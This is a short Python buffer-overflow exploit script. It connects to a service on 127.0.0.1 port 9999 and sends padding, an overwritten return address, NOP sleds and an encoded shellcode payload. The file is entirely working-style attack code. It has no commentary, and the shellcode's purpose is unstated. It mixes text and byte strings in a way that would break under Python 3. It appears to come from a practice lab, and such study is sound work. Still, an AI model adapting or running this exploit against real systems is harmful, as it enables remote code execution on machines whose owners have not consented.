import socket
import struct

total_length = 1022
pad = "A"*58
eip = struct.pack("<I", 0xffffceea)
payload =  b""
payload += b"\xbd\x85\xe5\x9c\x9c\xda\xcb\xd9\x74\x24\xf4\x58\x29"
payload += b"\xc9\xb1\x23\x31\x68\x13\x83\xe8\xfc\x03\x68\x8a\x07"
payload += b"\x69\xf6\x9e\x99\xa3\xdc\x69\xc6\x97\xa1\xc6\x63\x1a"
payload += b"\x96\x8e\xfa\xfb\x1b\xce\x6a\xa0\xcb\xb1\x94\x57\x0d"
payload += b"\x25\x97\x57\x18\x06\x1e\xb6\x48\x0e\x79\x69\xdc\x99"
payload += b"\xf0\x68\x9d\xe8\x83\xee\xe2\x8b\x9a\xbe\x96\x56\xf5"
payload += b"\x9c\x57\xa8\x05\xb9\x3d\xa8\x6f\x3c\x4b\x4b\x5e\xf7"
payload += b"\x86\x0b\x24\xc7\x60\xb6\xcc\xef\x20\xcf\xab\xf0\x54"
payload += b"\xcf\xcb\x79\xb7\x0e\x20\x75\xf9\x73\xbb\x36\x84\xbe"
payload += b"\x44\xb3\xb7\x38\x55\xe7\xbe\x59\xcc\xa5\xab\x29\xec"
payload += b"\x04\xab\xcc\x33\xee\xae\x31\x52\xb7\xae\xcd\x95\xc8"
payload += b"\x0b\xcc\x95\xc8\x6b\x03\x15\xf9\xb0\xf1\x17\xa2\x8b"
payload += b"\x85\x29\x89\x7e\x84\x11\xe0\xff"
nop_pre = "\x90"*136
nop_post = "\x90"*136
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.recv(1024)
s.sendall(pad + eip + nop_pre + payload + nop_post)
s.close()
